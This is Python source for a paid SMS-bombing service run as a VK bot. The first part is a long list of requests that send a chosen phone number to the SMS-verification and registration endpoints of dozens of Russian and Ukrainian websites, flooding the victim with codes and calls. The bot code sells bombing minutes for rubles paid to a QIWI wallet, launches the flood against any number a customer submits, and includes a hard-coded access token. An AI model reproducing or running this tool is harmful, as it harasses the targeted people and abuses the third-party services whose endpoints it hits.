        requests.post("https://e-groshi.com/online/reg",data={"first_name": name,"last_name": name,"third_name": name,"phone": phonemas,"password": password,"password2": password})
    except:
        pass
    try:
        requests.post("https://vladimir.edostav.ru/site/CheckAuthLogin",data={"phone_or_email": "+"+phone})
    except:
        pass
    try:
        requests.post("https://api.easypay.ua/api/auth/register",json={"phone": phone, "password": password})
    except:
        pass
    try:
        requests.post("https://my.dianet.com.ua/send_sms/", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": phone, "SignupForm[device_type]": 3})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.post("https://api.creditter.ru/confirm/sms/send",json={"phone": phonemas,"type": "register"})
    except:
        pass
    try:
        requests.post("https://clients.cleversite.ru/callback/run.php",data={"siteid": "62731","num":phone,"title": "Онлайн-консультант","referrer": "https://m.cleversite.ru/call"})
    except:
        pass
    try:
        requests.post("https://city24.ua/personalaccount/account/registration",data={"PhoneNumber": phone})
    except:
        pass
    try:
        requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{phone}/")
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.post("https://cinema5.ru/api/phone_code",data={"phone": phonemas})
    except:
        pass
    try:
        requests.post("https://api.cian.ru/sms/v1/send-validation-code/",json={"phone": "+"+phone, "type": "authenticateCode"})
    except:
        pass
    try:
        requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone","variables": {"phone": phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
    except:
        pass
    try:
        requests.get("https://it.buzzolls.ru:9995/api/v2/auth/register",params={"phoneNumber": "+"+phone,},headers={"keywordapi": "ProjectVApiKeyword", "usedapiversion": "3"})
    except:
        pass
    try:
        phonemas=mask(str=phone9, maska="(###)###-##-##")
        requests.post("https://bluefin.moscow/auth/register/",data={"phone": phonemas, "sendphone": "Далее"})
    except:
        pass
    try:
        requests.post("https://app.benzuber.ru/login", data={"phone": "+"+phone})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.post("https://bartokyo.ru/ajax/login.php",data={"user_phone": phonemas})
    except:
        pass
    try:
        requests.post("https://bamper.by/registration/?step=1",data={"phone": "+"+phone,"submit": "Запросить смс подтверждения","rules": "on"})
    except:
        pass
    try:
        phonemas=mask(str=phone9, maska="(###) ###-##-##")
        requests.get("https://avtobzvon.ru/request/makeTestCall",params={"to": phonemas})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.post("https://oauth.av.ru/check-phone",json={"phone": phonemas})
    except:
        pass
    try:
        requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": phone})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.post("https://apteka.ru/_action/auth/getForm/",data={"form[NAME]": "","form[PERSONAL_GENDER]": "","form[PERSONAL_BIRTHDAY]": "","form[EMAIL]": "","form[LOGIN]": phonemas,"form[PASSWORD]": password,"get-new-password": "Получите пароль по SMS","user_agreement": "on","personal_data_agreement": "on","formType": "simple","utc_offset": "120"})
    except:
        pass



    def write_message(sender, message):
        if i == 1:
            authorize.method('messages.send', {'user_id': sender, 'message': message, "random_id": get_random_id(),
                                               'keyboard': keyboard.get_keyboard()})
        if i == 2:
            authorize.method('messages.send', {'user_id': sender, 'message': message, "random_id": get_random_id(),
                                               'keyboard': clava2.get_keyboard()})
        if i == 3:
            authorize.method('messages.send', {'user_id': sender, 'message': message,
                                               "random_id": get_random_id(),
                                               'keyboard': clava3.get_keyboard()})
        if i == 4:
            authorize.method('messages.send', {'user_id': sender, 'message': message, "random_id": get_random_id(),
                                               'keyboard': clava4.get_keyboard()})
        if i == 5:
            authorize.method('messages.send', {'user_id': sender, 'message': message, "random_id": get_random_id(),
                                               'keyboard': clava5.get_keyboard()})
        if i == 6:
            authorize.method('messages.send', {'user_id': sender, 'message': message, "random_id": get_random_id(),
                                               'keyboard': clava6.get_keyboard()})

    def rass(soob, xui, govno, jopa):
        if 1 == 1:
            UsersId = open("baza.txt", "r")
            UsersId2 = set()
            for line in UsersId:
                UsersId2.add(line.strip())
            UsersId.close()

            suser = []
            for user in UsersId2:
                suser.append(str(user))
            if a == 1:
                succes = 0
                fail = 0
                for user in suser:
                    try:
                        with open(str(user) + "c.txt", "r") as ca:
                            i = ca.read()
                            i = int(i)
                        write_message(int(user), sms)
                        succes += 1
                    except:
                        fail += 1
                        continue
                so_ob = "none"
                write_message("173540024", "Рассылку получило - " + str(succes) + " пользователей")
                write_message("173540024", "Заблокировали бота - " + str(fail) + " пользователей")



    sp_mat = []

    def mat(message, ids):
        user = authorize.method("users.get", {"user_ids": ids})
        fullname = user[0]['first_name'] + ' ' + user[0]['last_name']
        for word in sp_mat:
            a = 0
            s = 0
            b = a + len(word)
            for i in range(len(message)):
                if s < 1:
                    if message[a:b] == word:
                        write_message(ids, f"Ну типа пользователь: \n[https://vk.com/id{ids}|{fullname}] 👤 \nСообщение: {reseived_message} \nматершинник ппц")
                        s += 1
                        break
                    else:
                        a += 1
                        b += 1



    token = "f6864cd7b57dcb6e0f45ed2e97e82c1c959c3f7e37d6f064af5f53f3509996aed8fc511978c0f42d7beaa"
    authorize = vk_api.VkApi(token=token)
    longpoll = VkLongPoll(authorize)
    admin = 173540024 or 574170405
    for event in longpoll.listen():
        if event.type == VkEventType.MESSAGE_NEW and event.to_me:
            try:
                a = open(str(event.user_id) + "c.txt", "r")
                a.close()
            except:
                a = open(str(event.user_id) + "c.txt", "w")
                a.write("1")
                a.close()
            with open(str(event.user_id) + "c.txt", "r") as ca:
                i = ca.read()
                i = int(i)
            try:
                a = open(str(event.user_id) + ".txt", "r")
                a.close()
            except:
                a = open(str(event.user_id) + ".txt", "w")
                a.write("1")
                a.close()
                write_message(event.user_id, 'На ваш баланс зачислен бонус: \n1 руб 💰')
            with open(str(event.user_id) + ".txt", "r") as ba2:
                bal2 = ba2.read()
                bal2 = int(bal2)
            reseived_message = event.text.lower()
            sender = event.user_id
            user = authorize.method("users.get", {"user_ids": event.user_id})  # вместо 1 подставляете айди нужного юзера
            name = user[0]['first_name']
            mat(reseived_message, sender)
            if reseived_message == 'начать' and i == 1 \
                    or reseived_message == 'начать' and i == 1 \
                    or reseived_message == 'привет' and i == 1 \
                    or reseived_message == 'ку' and i == 1 \
                    or reseived_message == 'хай' and i == 1 \
                    or reseived_message == 'здравствуйте' and i == 1 \
                    or reseived_message == 'start' and i == 1 \
                    or reseived_message == 'дарова' and i == 1:
                if check(sender) == 0:
                    adder(sender)
                    try:
                        a = open(str(sender) + ".txt", "r")
                        a.close()
                    except:
                        a = open(str(sender) + ".txt", "w")
                        a.write("1")
                        a.close()
                        write_message(sender, 'На ваш баланс зачислен бонус: \n1 руб 💰')
                    with open(str(event.user_id) + ".txt", "r") as ba2:
                        bal2 = ba2.read()
                        bal2 = int(bal2)
                write_message(sender, "Привет " + name + '! \nРады видеть тебя в нашей группе 😊')
                write_message(sender, 'Вы в главном меню: \n\n- Bomber \n- Поддержка \n- Баланс \n- Пополнить')

            elif reseived_message[0:6] == 'bomber':
                try:
                    a = open(str(event.user_id) + "ph.txt", "r")
                    a.close()
                except:
                    a = open(str(event.user_id) + "ph.txt", "w")
                    a.write("1")
                    a.close()
                with open(str(event.user_id) + "ph.txt", "r") as cha:
                    hi = cha.read()
                    hi = int(hi)
                a = open(str(sender) + "c.txt", "w")
                a.write("4")
                a.close()
                with open(str(sender) + "c.txt", "r") as ca:
                    i = ca.read()
                    i = int(i)
                if hi == 0:
                    write_message(sender, 'Введите номер и время действия бомбера (в минутах): \nЦена: 1₽ = 1мин 💰\nПример: 79287777777 5')
                else:
                    write_message(sender,
                                  'Рекомендую проверить бомбер на себе, для этого мы выдали Вам 1 руб. ❗ \n\nВведите номер и время действия бомбера (в минутах): \nЦена: 1₽ = 1мин 💰\nПример: 79287777777 5')

            elif (reseived_message[0:11])[0:2] == "79" and len(extract_aarg(reseived_message[0:11])) == 11 and i == 4:
                try:
                    try:
                        a = open(str(event.user_id) + ".txt", "r")
                        a.close()
                    except:
                        a = open(str(event.user_id) + ".txt", "w")
                        a.write("0")
                        a.close()
                    with open(str(event.user_id) + ".txt", "r") as ba2:
                        bal2 = ba2.read()
                        bal2 = int(bal2)
                    a = open(str(sender) + "c.txt", "w")
                    a.write("1")
                    a.close()
                    with open(str(sender) + "c.txt", "r") as ca:
                        i = ca.read()
                        i = int(i)
                    if str(int(extract_arg(reseived_message))) > str(0):
                        mony = str(int(extract_arg(reseived_message)))
                        nomber = str(int(extract_aarg(reseived_message)))
                        if str(bal2) >= str(int(extract_arg(reseived_message))):
                            nom = threading.Thread(target=bomber, args=(nomber, mony, 1, 2))
                            nom.start()
                            a = open(str(sender) + ".txt", "w")
                            a.write(str(int(bal2) - int(extract_arg(reseived_message))))
                            a.close()
                            with open(str(event.user_id) + ".txt", "r") as ba2:
                                bal2 = ba2.read()
                                bal2 = int(bal2)
                            with open(str(event.user_id) + "ph.txt", "r") as cha:
                                hi = cha.read()
                                hi = int(hi)
                            a = open(str(sender) + "ph.txt", "w")
                            a.write('0')
                            a.close()

                            write_message(sender, '💣 Спам запущен!')
                        else:
                            a = open(str(sender) + "c.txt", "w")
                            a.write("2")
                            a.close()
                            with open(str(sender) + "c.txt", "r") as ca:
                                i = ca.read()
                                i = int(i)
                            write_message(sender, 'У вас недостаточно средств 😞')
                    else:
                        a = open(str(sender) + "c.txt", "w")
                        a.write("2")
                        a.close()
                        with open(str(sender) + "c.txt", "r") as ca:
                            i = ca.read()
                            i = int(i)
                        write_message(sender, 'Баланс меньше 1 руб 💰')
                except:
                    a = open(str(sender) + "c.txt", "w")
                    a.write("4")
                    a.close()
                    with open(str(sender) + "c.txt", "r") as ca:
                        i = ca.read()
                        i = int(i)
                    write_message(sender, 'Вы не указали количество минут после номера...')
            elif reseived_message[0:5] == 'назад' and i == 2 or reseived_message[0:5] == 'назад' and i == 3 or reseived_message[0:5] == 'назад' and i == 4:
                a = open(str(sender) + "c.txt", "w")
                a.write("1")
                a.close()
                with open(str(sender) + "c.txt", "r") as ca:
                    i = ca.read()
                    i = int(i)
                write_message(sender, 'Вы в главном меню: \n\n- Bomber \n- Поддержка \n- Баланс \n- Пополнить')
            elif reseived_message[0:5] == 'назад' and i == 5:
                a = open(str(sender) + "c.txt", "w")
                a.write("2")
                a.close()
                with open(str(sender) + "c.txt", "r") as ca:
                    i = ca.read()
                    i = int(i)
                write_message(sender, 'Выбери cпособ пополнения 💳')
            elif reseived_message[0:6] == "баланс":
                try:
                    a = open(str(event.user_id) + ".txt", "r")
                    a.close()
                except:
                    a = open(str(event.user_id) + ".txt", "w")
                    a.write("1")
                    a.close()
                    write_message(sender, 'На ваш баланс зачислен бонус: \n1 руб 💰')
                with open(str(event.user_id) + ".txt", "r") as ba2:
                    bal2 = ba2.read()
                    bal2 = int(bal2)
                with open(str(sender) + "c.txt", "r") as ca:
                    i = ca.read()
                    i = int(i)
                write_message(sender, "Твой баланс: " + str(bal2) + " руб 💰")

            elif reseived_message[0:9] == 'поддержка':
                a = open(str(sender) + "c.txt", "w")
                a.write("3")
                a.close()
                with open(str(sender) + "c.txt", "r") as ca:
                    i = ca.read()
                    i = int(i)
                write_message(sender, 'Введите ваш вопрос 🤔\nНаш администратор обязательно его рассмотрит 👤')
            elif reseived_message[0:9] == "пополнить" and i != 3:
                a = open(str(sender) + "c.txt", "w")
                a.write("2")
                a.close()
                with open(str(sender) + "c.txt", "r") as ca:
                    i = ca.read()
                    i = int(i)
                write_message(sender, "Выберите способ оплаты")
            elif reseived_message[0:11] == "оплата qiwi" and i == 2:
                a = open(str(sender) + "c.txt", "w")
                a.write("5")
                a.close()
                with open(str(sender) + "c.txt", "r") as ca:
                    i = ca.read()
                    i = int(i)
                write_message(sender, 'Кошелек для платежа: +375296551581 \n Примечание к платежу: ' + "1" + str(sender) + ' ❗ \n\nТак же оплатить можно с помощью карты (выбирается на сайте). \n\nПосле оплаты на Ваш баланс будет зачислена сумма перевода. Об этом вас уведомят.')
            elif reseived_message[0:4] == 'меню':
                a = open(str(sender) + "c.txt", "w")
                a.write("1")
                a.close()
                with open(str(sender) + "c.txt", "r") as ca:
                    i = ca.read()
                    i = int(i)
                write_message(sender, 'Вы в главном меню: \n\n- Bomber \n- Поддержка \n- Баланс \n- Пополнить')
            elif reseived_message[0:2] == "фф":
                if sender == admin:
                    try:
                        id = extract_arg(reseived_message)
                        bal = extract_arg2(reseived_message)
                        a = open(str(id) + ".txt", "r")
                        skoko = a.read()
                        skoko = int(skoko)
                        a.close()
                        a = open(str(id) + ".txt", "w")
                        a.write(str(skoko + int(bal)))
                        a.close()
                        write_message(event.user_id, "Готово")
                        write_message(str(id), "На ваш баланс зачислено " + str(bal) + " руб.")
                    except:
                        with open(str(event.user_id) + "c.txt", "r") as ca:
                                i = ca.read()
                                i = int(i)
                        write_message(event.user_id, "Вы не указали айди или сумму")
                else:
                    with open(str(event.user_id) + "c.txt", "r") as ca:
                                i = ca.read()
                                i = int(i)
                    write_message(sender, 'Вы не являетесь администратором 👤')
            elif reseived_message[0:8] == "рассылка":
                if sender == admin:
                    a = 0
                    try:
                        sm = extract_arg(event.text)
                        a = 1
                    except:
                        write_message(event.user_id, "Вы не указали текст для рассылки")
                    if a == 1:
                        with open(str(event.user_id) + "c.txt", "r") as ca:
                            i = ca.read()
                            i = int(i)
                        write_message(event.user_id, "Рссылка началась")
                        sms = event.text[8:]
                        so_ob = sms
                        t = threading.Thread(target=rass, args=(sms, 1, 2, 3))
                        t.start()
                else:
                    write_message(sender, 'Вы не являетесь администратором 👤')
            else:
                if i == 1:
                    write_message(sender, 'Я Вас не понял, повторите попытку. :/')
                elif i == 4:
                    write_message(sender, 'Введите номер нормально ⛔')
                elif i == 3:
                    a = open(str(sender) + "c.txt", "w")
                    a.write("1")
                    a.close()
                    with open(str(sender) + "c.txt", "r") as ca:
                        i = ca.read()
                        i = int(i)
                    user = authorize.method("users.get", {"user_ids": sender})
                    fullname = user[0]['first_name'] + ' ' + user[0]['last_name']
                    write_message(173540024, f'Тебя зовут: [https://vk.com/id{sender}|{fullname}] 👤 \nСообщение: {reseived_message} ')
                    write_message(sender, 'Спасибо за обращение. \nМодератор ответит Вам в ближайшее время. 👤')
                elif i == 2:
                    write_message(sender, 'Выбери способ пополнения 💳')
                else:
                    write_message(sender, 'Я тебя не понял :/')
except:
    system('python3 bomber.py')

